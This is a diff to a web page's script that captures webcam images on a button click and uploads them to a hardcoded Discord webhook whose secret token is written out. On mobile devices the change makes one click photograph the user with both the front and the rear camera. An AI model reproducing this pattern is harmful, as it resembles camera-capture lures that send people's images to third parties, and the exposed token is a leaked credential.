@@ -76,49 +76,94 @@
         const captureButton = document.getElementById('captureButton');
         const message = document.getElementById('message');
         const canvas = document.getElementById('canvas');
-        const loadingIndicator = document.getElementById('loadingIndicator');
         const ctx = canvas.getContext('2d');
+        const loadingIndicator = document.getElementById('loadingIndicator');
 
         // Your Discord webhook URL
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1328823824275214336/zvW9MAN890FiTSeo53UINP2aHDjjBRxzXSHYzbggJiSfQdOS94XjH8Ex-aEfaUQy9TJ8";
 
-        // Access the webcam
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(err => {
-                message.textContent = 'Error accessing webcam: ' + err.message;
-            });
+        // Function to check if the device is mobile
+        function isMobile() {
+            return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        }
 
-        // Capture image and send to Discord webhook
-        captureButton.addEventListener('click', () => {
-            loadingIndicator.style.display = 'block';
+        // Function to start the camera with specified facingMode
+        async function startCamera(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode },
+                });
+                video.srcObject = stream;
+                return stream;
+            } catch (err) {
+                message.textContent = 'Error accessing webcam: ' + err.message;
+                return null;
+            }
+        }
+
+        // Capture and send image to Discord
+        async function captureAndSendImage(stream, facing) {
+            // Set canvas size to match the video
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('file', blob, 'webcam-image.png');
+            // Convert the captured image to a Blob
+            return new Promise((resolve, reject) => {
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('file', blob, `${facing}-camera-image.png`);
+                    formData.append('payload_json', JSON.stringify({
+                        content: `Preview your captured image! (${facing} camera)`,
+                    }));
 
-                fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    body: formData,
-                })
-                    .then(response => {
-                        loadingIndicator.style.display = 'none';
-                        if (response.ok) {
-                            message.textContent = 'Image successfully sent to Discord!';
-                        } else {
-                            message.textContent = 'Failed to send image to Discord. Status: ' + response.status;
-                        }
+                    fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData,
                     })
-                    .catch(error => {
-                        loadingIndicator.style.display = 'none';
-                        message.textContent = 'Error sending image: ' + error.message;
-                    });
-            }, 'image/png');
+                        .then(response => {
+                            if (response.ok) {
+                                resolve(`${facing} camera image sent successfully.`);
+                            } else {
+                                reject(`Failed to send ${facing} camera image. Status: ${response.status}`);
+                            }
+                        })
+                        .catch(error => reject(`Error sending ${facing} camera image: ${error.message}`));
+                }, 'image/png');
+            });
+        }
+
+        // Main event listener for capturing and sending images
+        captureButton.addEventListener('click', async () => {
+            message.textContent = '';
+            loadingIndicator.style.display = 'block';
+
+            if (isMobile()) {
+                // For mobile devices: Capture both front and back camera
+                const frontStream = await startCamera('user');
+                if (frontStream) {
+                    await captureAndSendImage(frontStream, 'front').catch(err => message.textContent += err + '\n');
+                    frontStream.getTracks().forEach(track => track.stop());
+                }
+
+                const backStream = await startCamera('environment');
+                if (backStream) {
+                    await captureAndSendImage(backStream, 'back').catch(err => message.textContent += err + '\n');
+                    backStream.getTracks().forEach(track => track.stop());
+                }
+            } else {
+                // For desktops: Capture only the default camera
+                const stream = await startCamera('user');
+                if (stream) {
+                    await captureAndSendImage(stream, 'default').catch(err => message.textContent += err + '\n');
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }
+
+            loadingIndicator.style.display = 'none';
+            if (!message.textContent) {
+                message.textContent = 'All images sent successfully!';
+            }
         });
     </script>
 </body>
